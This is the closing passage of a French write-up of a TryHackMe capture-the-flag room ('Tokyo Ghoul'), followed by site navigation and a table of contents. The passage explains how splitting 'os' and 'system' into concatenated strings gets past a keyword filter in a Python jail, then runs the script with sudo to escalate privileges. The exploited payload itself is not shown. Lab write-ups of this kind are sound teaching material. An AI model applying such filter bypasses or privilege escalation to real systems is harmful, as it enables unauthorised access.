<li><code>'o'+'s'</code> contourne le filtre sur <code>os</code>.</li>
<li><code>'sy'+'stem'</code> contourne le filtre sur <code>system</code>.</li>
</ul>
<p>On exécute notre payload :</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /usr/bin/python3 /home/kamishiro/jail.py</span></span></code></pre></div></article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">

<div>

</div>

<div>

</div>

</div>





  
  
  
  <div class="flex flex-wrap justify-between">
    <span>
    
      <a href="/docs/tryhackme/collapsed/rootme/" class="flex align-center">
        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
        <span>RootMe</span>
      </a>
    
    </span>
    <span>
    
      <a href="/docs/tryhackme/collapsed/wonderlands/" class="flex align-center">
        <span>Wonderlands</span>
        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
      </a>
    
    </span>
  </div>
  


 
        
  
  <div class="book-comments">

</div>
  
 
        
        
  
 
        
  
  
    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
  

      </footer>

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
  
  <aside class="book-toc">
    <div class="book-toc-content">
      
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#tokyo-ghoul">Tokyo Ghoul</a>
      <ul>
        <li><a href="#introduction"><strong>Introduction</strong></a></li>
        <li><a href="#reconnaissance-et-énumération-des-services">Reconnaissance et énumération des services</a>
          <ul>
            <li><a href="#scan-de-ports-avec-nmap">Scan de ports avec Nmap</a></li>
          </ul>
        </li>
        <li><a href="#exploitation-du-service-ftp">Exploitation du service FTP</a>
          <ul>
            <li><a href="#récupération-du-binaire-need_to_talk">Récupération du binaire <code>need_to_talk</code></a></li>
          </ul>
        </li>
        <li><a href="#stéganographie-et-cryptographie">Stéganographie et cryptographie</a>
          <ul>
            <li><a href="#extraction-de-données-cachées-dans-une-image">Extraction de données cachées dans une image</a></li>
            <li><a href="#déchiffrement-du-code-morse">Déchiffrement du code Morse</a></li>
          </ul>
        </li>
        <li><a href="#énumération-du-service-http">Énumération du service HTTP</a>
          <ul>
            <li><a href="#recherche-de-répertoires-cachés-avec-gobuster">Recherche de répertoires cachés avec Gobuster</a></li>
            <li><a href="#exploitation-dune-faille-lfi-cwe-98">Exploitation d’une faille LFI (CWE-98)</a></li>
          </ul>
        </li>
        <li><a href="#cracking-du-mot-de-passe-de-lutilisateur-kamishiro">Cracking du mot de passe de l’utilisateur <code>kamishiro</code></a>
          <ul>
            <li><a href="#utilisation-de-john-the-ripper">Utilisation de John the Ripper</a></li>
          </ul>
        </li>
        <li><a href="#post-exploitation">Post-Exploitation</a>
          <ul>
            <li><a href="#connexion-en-tant-que-kamishiro">Connexion en tant que <code>kamishiro</code></a></li>
            <li><a href="#vérification-des-droits-sudo">Vérification des droits sudo</a></li>
          </ul>
        </li>
        <li><a href="#escalade-de-privilège">Escalade de Privilège</a>
          <ul>
            <li><a href="#analyse-du-script">Analyse du script</a></li>
            <li><a href="#contournement-des-restrictions">Contournement des restrictions</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>



    </div>
  </aside>
  
 
  </main>

  
</body>
</html>




















